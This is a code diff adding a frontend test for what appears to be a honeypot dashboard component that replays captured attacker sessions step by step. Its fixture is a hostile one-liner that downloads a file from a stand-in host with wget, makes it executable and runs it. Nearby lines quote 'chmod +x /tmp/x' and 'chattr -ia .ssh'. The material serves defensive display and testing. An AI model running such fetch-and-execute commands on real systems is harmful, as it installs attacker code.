@@ -375,6 +375,24 @@ describe("FeaturedAttack", () => {
     expect(screen.getByText("chmod +x /tmp/x")).toBeInTheDocument();
   });
 
+  it("replays a one-line script step by step, keeping quoted text whole", () => {
+    // Attacks here are usually one long line. Clamped whole, the replay showed
+    // the first step and hid the fetch and the run.
+    withReducedMotion();
+    const line = "uname -a; cd /tmp || cd /var/tmp; echo 'a;b' > k; wget http://x.example/a; chmod +x a; ./a";
+    render(<FeaturedAttack {...props} data={{
+      session: attack.session,
+      events: [{ timestamp: "2026-08-16T10:00:20Z", command: line, username: null, password: null, tags: [] }],
+    }} />);
+    expect(screen.getByText("uname -a")).toBeInTheDocument();
+    expect(screen.getByText("cd /tmp || cd /var/tmp")).toBeInTheDocument();
+    expect(screen.getByText("echo 'a;b' > k")).toBeInTheDocument();
+    expect(screen.getByText("wget http://x.example/a")).toBeInTheDocument();
+    expect(screen.getByText("./a")).toBeInTheDocument();
+    // Still one command, however many steps it shows.
+    expect(screen.getByText(/1 command in/)).toBeInTheDocument();
+  });
+
   it("collapses events ingested more than once", () => {
     // A 2026-08-09 session holds twelve exact copies of every event. Replaying
     // "chattr -ia .ssh" twelve times reads as a broken page, not an attack.
